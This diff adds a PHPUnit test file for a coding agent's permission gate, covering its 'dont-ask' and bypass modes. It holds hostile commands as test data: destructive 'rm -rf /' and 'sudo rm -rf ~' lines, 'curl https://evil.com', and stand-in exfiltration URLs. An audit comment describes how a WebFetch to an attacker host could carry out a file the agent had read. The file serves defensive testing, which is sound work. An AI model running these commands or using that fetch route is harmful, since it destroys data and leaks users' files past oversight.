@@ -1,0 +1,378 @@
+<?php
+
+declare(strict_types=1);
+
+namespace SugarCraft\Code\Tests\Permissions;
+
+use PHPUnit\Framework\TestCase;
+use SugarCraft\Code\Permissions\PermissionAction;
+use SugarCraft\Code\Permissions\PermissionDecision;
+use SugarCraft\Code\Permissions\PermissionGate;
+use SugarCraft\Code\Permissions\PermissionMode;
+use SugarCraft\Code\Permissions\PermissionRule;
+use SugarCraft\Code\ToolCall;
+
+/**
+ * @see PermissionGate
+ * @see PermissionMode::DontAsk
+ * @see PermissionMode::BypassPermissions
+ */
+final class PermissionGateDontAskBypassTest extends TestCase
+{
+    // =========================================================================
+    // DontAsk Mode Tests
+    // =========================================================================
+
+    /**
+     * DontAsk: read-only tool → Allow (no rule needed).
+     */
+    public function testDontAskAllowsReadToolWithoutRule(): void
+    {
+        $gate = new PermissionGate(PermissionMode::DontAsk);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Read',
+            arguments: ['file_path' => '/etc/hosts'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+
+    /**
+     * DontAsk: Grep is read-only → Allow.
+     */
+    public function testDontAskAllowsGrepWithoutRule(): void
+    {
+        $gate = new PermissionGate(PermissionMode::DontAsk);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Grep',
+            arguments: ['pattern' => 'localhost', 'path' => '/etc/hosts'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+
+    /**
+     * DontAsk: Glob is read-only → Allow.
+     */
+    public function testDontAskAllowsGlobWithoutRule(): void
+    {
+        $gate = new PermissionGate(PermissionMode::DontAsk);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Glob',
+            arguments: ['pattern' => '**/*.php'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+
+    /**
+     * DontAsk: WebFetch is NOT read-only → Deny without a rule (audit F-P6).
+     *
+     * This case used to assert Allow, and the Allow was the defect: `dont-ask`
+     * is documented as "deny everything not pre-approved", yet
+     * `WebFetch https://attacker/?d=<base64 of a file Read just returned>` ran
+     * unprompted because the gate classed a fetch as a read. A fetch is an
+     * outbound request whose URL the model composes.
+     */
+    public function testDontAskDeniesWebFetchWithoutRule(): void
+    {
+        $gate = new PermissionGate(PermissionMode::DontAsk);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'WebFetch',
+            arguments: ['url' => 'https://example.com'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * The re-grant the fix pairs with: a `WebFetch(domain:…)` allow rule lets
+     * the user's trusted host through `dont-ask`, and only that host.
+     */
+    public function testDontAskAllowsWebFetchToADomainAnAllowRuleNames(): void
+    {
+        $gate = new PermissionGate(
+            PermissionMode::DontAsk,
+            [new PermissionRule('WebFetch(domain:example.com)', PermissionAction::Allow)],
+        );
+
+        $this->assertSame(
+            PermissionDecision::Allow,
+            $gate->evaluate(new ToolCall('WebFetch', ['url' => 'https://example.com/docs?page=2'])),
+        );
+        $this->assertSame(
+            PermissionDecision::Deny,
+            $gate->evaluate(new ToolCall('WebFetch', ['url' => 'https://evil.example/?d=secret'])),
+        );
+    }
+
+    /**
+     * DontAsk: Bash with no matching rule → Deny.
+     */
+    public function testDontAskDeniesBashWithNoMatchingRule(): void
+    {
+        $gate = new PermissionGate(PermissionMode::DontAsk);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'composer install'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * DontAsk: Edit with no matching rule → Deny.
+     */
+    public function testDontAskDeniesEditWithNoMatchingRule(): void
+    {
+        $gate = new PermissionGate(PermissionMode::DontAsk);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Edit',
+            arguments: ['file_path' => './foo.php', 'old_string' => 'x', 'new_string' => 'y'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * DontAsk: explicit Allow rule overrides → Allow.
+     */
+    public function testDontAskExplicitAllowRuleOverridesDefaultDeny(): void
+    {
+        $gate = new PermissionGate(
+            PermissionMode::DontAsk,
+            rules: [
+                new PermissionRule(pattern: 'Bash*', action: PermissionAction::Allow),
+            ],
+        );
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'composer install'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+
+    /**
+     * DontAsk: explicit Deny rule overrides → Deny (even for read-only).
+     */
+    public function testDontAskExplicitDenyRuleOverridesDefaultAllow(): void
+    {
+        $gate = new PermissionGate(
+            PermissionMode::DontAsk,
+            rules: [
+                new PermissionRule(pattern: 'Read', action: PermissionAction::Deny),
+            ],
+        );
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Read',
+            arguments: ['file_path' => '/etc/hosts'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    // =========================================================================
+    // BypassPermissions Mode Tests
+    // =========================================================================
+
+    /**
+     * BypassPermissions: normal dangerous command → Allow.
+     */
+    public function testBypassPermissionsAllowsNormalDangerousCommand(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'rm -rf ./node_modules'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+
+    /**
+     * BypassPermissions: allows arbitrary shell commands.
+     */
+    public function testBypassPermissionsAllowsBashCommands(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'curl https://evil.com'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+
+    /**
+     * BypassPermissions: `rm -rf /` → Deny (circuit breaker).
+     */
+    public function testBypassPermissionsDeniesRmRfRoot(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'rm -rf /'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * BypassPermissions: `rm -rf ~` → Deny (circuit breaker).
+     */
+    public function testBypassPermissionsDeniesRmRfHome(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'rm -rf ~'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * BypassPermissions: `sudo rm -rf /` → Deny (circuit breaker).
+     */
+    public function testBypassPermissionsDeniesSudoRmRfRoot(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'sudo rm -rf /'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * BypassPermissions: `sudo rm -rf ~` → Deny (circuit breaker).
+     */
+    public function testBypassPermissionsDeniesSudoRmRfHome(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'sudo rm -rf ~'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * BypassPermissions: case-insensitive `SUDO RM -RF /` → Deny.
+     */
+    public function testBypassPermissionsDeniesUpperCaseSudoRmRfRoot(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'SUDO RM -RF /'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * BypassPermissions: explicit Deny rule → Deny.
+     */
+    public function testBypassPermissionsExplicitDenyRuleOverrides(): void
+    {
+        $gate = new PermissionGate(
+            PermissionMode::BypassPermissions,
+            rules: [
+                new PermissionRule(pattern: 'Bash*', action: PermissionAction::Deny),
+            ],
+        );
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'ls -la'],
+        ));
+
+        $this->assertSame(PermissionDecision::Deny, $decision);
+    }
+
+    /**
+     * BypassPermissions: explicit Allow rule → Allow.
+     *
+     * Folded in (owner ruling 2026-10-06): an explicit ASK rule is neutralised
+     * to the mode's own Allow — the Ask class is exactly what bypass waives —
+     * while the neighbouring Deny rule above stays the floor. Control row:
+     * outside bypass the same Ask rule still asks.
+     */
+    public function testBypassPermissionsExplicitAllowRuleOverrides(): void
+    {
+        $gate = new PermissionGate(
+            PermissionMode::BypassPermissions,
+            rules: [
+                new PermissionRule(pattern: 'Bash*', action: PermissionAction::Allow),
+            ],
+        );
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Bash',
+            arguments: ['command' => 'anything'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+
+        $asking = new PermissionGate(
+            PermissionMode::BypassPermissions,
+            rules: [
+                new PermissionRule(pattern: 'Bash*', action: PermissionAction::Ask),
+            ],
+        );
+
+        $this->assertSame(
+            PermissionDecision::Allow,
+            $asking->evaluate(new ToolCall(name: 'Bash', arguments: ['command' => 'anything'])),
+            'an Ask rule is a question bypass has already answered',
+        );
+
+        $stillAsks = new PermissionGate(
+            PermissionMode::Default,
+            rules: [
+                new PermissionRule(pattern: 'Bash*', action: PermissionAction::Ask),
+            ],
+        );
+
+        $this->assertSame(
+            PermissionDecision::Ask,
+            $stillAsks->evaluate(new ToolCall(name: 'Bash', arguments: ['command' => 'anything'])),
+            'only bypass answers asks',
+        );
+    }
+
+    /**
+     * BypassPermissions: non-Bash tool with `rm -rf` in arguments is not caught
+     * (circuit breaker only applies to Bash tool).
+     */
+    public function testBypassPermissionsAllowsNonBashTool(): void
+    {
+        $gate = new PermissionGate(PermissionMode::BypassPermissions);
+
+        $decision = $gate->evaluate(new ToolCall(
+            name: 'Edit',
+            arguments: ['file_path' => './foo.php', 'old_string' => 'x', 'new_string' => 'y'],
+        ));
+
+        $this->assertSame(PermissionDecision::Allow, $decision);
+    }
+}
